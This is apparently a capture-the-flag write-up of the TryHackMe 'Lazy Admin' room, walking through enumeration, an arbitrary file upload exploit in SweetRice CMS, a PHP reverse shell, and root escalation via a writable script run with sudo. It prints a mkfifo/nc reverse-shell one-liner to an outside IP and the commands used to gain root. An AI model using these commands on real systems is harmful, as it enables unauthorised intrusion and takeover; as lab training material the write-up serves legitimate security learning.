---
title: <img width="50" height="50" alt="front-page port 80-shoopyu" src="https://tryhackme-images.s3.amazonaws.com/room-icons/efbb70493ba66dfbac4302c02ad8facf.jpeg">  Lazy Admin | Tryhackme | Easy
author: cotes
date: 2023-01-05 14:10:00 +0600
categories: [Write Up, TryHackMe]
tags: [walkthrough, lazy admin, fileupload, arbitrary file upload,basic cms,sweetrice,apache2,ssh]
render_with_liquid: false
---
&nbsp;

<img width="488" allign="center" alt="simple-ctf-logo" src="https://tryhackme-images.s3.amazonaws.com/room-icons/efbb70493ba66dfbac4302c02ad8facf.jpeg">


## Enumeration 

```bash
                                                                                                                    
┌──(root㉿kali)-[/home/local_host/Desktop/THM]
└─# nmap -sV 10.10.39.105
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-12 11:35 IST
Nmap scan report for 10.10.39.105
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 20.10 seconds
```


**Let's check out port number 80**


![apache](https://github.com/thelocalh0st/thelocalh0st.github.io/assets/125783410/e48bdece-c571-4717-ab3a-9a49d3b2d674)

**We can see that it's a apache2 Ubuntu Default page let's discover the directories by gobuster**

```sh
┌──(root㉿kali)-[/home/local_host/Desktop/THM]
└─# gobuster dir -u 10.10.39.105 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -q
/.hta                 (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/content              (Status: 301) [Size: 314] [--> http://10.10.39.105/content/]
/index.html           (Status: 200) [Size: 11321]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 277]
```

🤔🤔 ```/content```


**There's a Sweet Rice notice**

![line-63-sweetrice](https://github.com/thelocalh0st/thelocalh0st.github.io/assets/125783410/6ac0ad67-95ae-4ae7-9837-adadab19db0c)


Let's Check the sub directories of /content aswell!!

```sh
┌──(root㉿kali)-[/home/local_host/Desktop/THM]
└─# gobuster dir -u 10.10.39.105/content -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -q
/.hta                 (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/_themes              (Status: 301) [Size: 322] [--> http://10.10.39.105/content/_themes/]
/as                   (Status: 301) [Size: 317] [--> http://10.10.39.105/content/as/]
/attachment           (Status: 301) [Size: 325] [--> http://10.10.39.105/content/attachment/]
/changelog.txt        (Status: 200) [Size: 18013]
/images               (Status: 301) [Size: 321] [--> http://10.10.39.105/content/images/]
/inc                  (Status: 301) [Size: 318] [--> http://10.10.39.105/content/inc/]
/index.php            (Status: 200) [Size: 2198]
/index.php            (Status: 200) [Size: 2198]
/js                   (Status: 301) [Size: 317] [--> http://10.10.39.105/content/js/]
/license.txt          (Status: 200) [Size: 15410]
```

**changelog.txt**🔍
```
#############################################
SweetRice - Simple Website Management System
Version 1.5.0
Author:Hiler Liu steelcal@gmail.com
Home page:http://www.basic-cms.org/
#############################################
New web - new SweetRice for both PC & mobile website creator,easy way to follow the new web world.

========================================
```


We can  now conclude that the target machine is using SweetRice CMS V1.5.0. Let's search  [Exploit-DB](https://www.exploit-db.com/) 

![line112](https://github.com/thelocalh0st/thelocalh0st.github.io/assets/125783410/adeb2fdc-563a-4ea4-b622-7706ec137f15)


&nbsp;
download and open the ```mysql_bakup_20191129023059-1.5.1.sql file```

We now have a username and a password hash. Let's crack the hash using hashcat.

![crackstation](https://user-images.githubusercontent.com/95465072/214611298-2d296100-6907-46a2-a13a-b2b255c183f9.png)

![line-120](https://github.com/thelocalh0st/thelocalh0st.github.io/assets/125783410/d9286575-7143-4767-b193-b5bdce1ad931)



We can now login to admin panel as we have both the username and password
![line-123](https://github.com/thelocalh0st/thelocalh0st.github.io/assets/125783410/92c602ed-77c3-4930-be66-6367da47bc40)


We have found that there's  [Arbitrary File Upload](https://www.exploit-db.com/exploits/40716) vulnurablity. We can exploit it to upload a reverse shell script and gain access to the target machine.


```

+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|  _________                      __ __________.__                  |
| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
| \_____  \ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
| /        \     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
|/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    |
|        \/             \/     \/            \/        \/    \/     |
|    > SweetRice 1.5.1 Unrestricted File Upload                     |
|    > Script Cod3r : Ehsan Hosseini                                |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+

[+] Sending User&Pass...
[+] Login Succssfully...
[+] File Uploaded...
[+] URL : http://10.10.39.105/content/attachment/shell.php5
```


![127](https://github.com/thelocalh0st/thelocalh0st.github.io/assets/125783410/e942147a-d5b2-4637-a93c-e8f553c71662)


```
❯ nc -nlvp 1234
Connection from 10.10.39.105:44046
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 09:34:23 up 33 min,  0 users,  load average: 0.00, 0.01, 0.24
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

### Let's navigate the file system to find the user.txt.

```
$ cd /home
$ ls
itguy
$ cd itguy
$ ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
backup.pl
examples.desktop
mysql_login.txt
user.txt
$ cat user.txt
THM{63e5bce927******************}
```

## Privilege Escalation

```
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
$ cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

The [backup.pl](http://backup.pl/) script executes /etc/[copy.sh](http://copy.sh/). !!!!!!

```
$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

### We can run this file as root, so if we create a reverse shell using this file, we can get root access to the target machine from our host macine

```
$ echo 'php /var/www/html/content/attachment/shell.php5' > /etc/copy.sh
```

### Now we have to run [backup.pl](http://backup.pl/) as root.

```
$ sudo /usr/bin/perl /home/itguy/backup.pl
$ Successfully opened reverse shell to 10.17.15.106:1234
```

```
$ nc -nlvp 1234
Connection from 10.10.39.105:44052
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 09:46:00 up 44 min,  0 users,  load average: 0,00, 0,00, 0,09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
THM{6637f41d01***************}
```

# CONGRAGULATIONS !💫
